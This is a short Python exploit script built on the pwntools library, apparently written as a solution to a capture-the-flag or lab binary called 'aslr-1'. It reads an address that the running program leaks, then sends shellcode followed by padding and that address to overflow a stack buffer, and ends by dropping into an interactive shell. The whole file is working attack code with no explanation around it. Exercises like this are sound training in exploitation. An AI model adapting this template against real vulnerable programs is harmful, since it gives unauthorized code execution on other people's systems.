#!/usr/bin/env python

from pwn import *

p = process("./aslr-1")
f = open("shellcode.bin", "r")
shellcode = f.read().strip()

l = p.recvline(1)
addr = l.split()
addr = addr[4]
addr = int(addr,16)
print("addr --> " + str(hex(addr)))
buffer = shellcode + "A"*(140-36) + p32(addr)

p.sendline(buffer)
p.interactive()
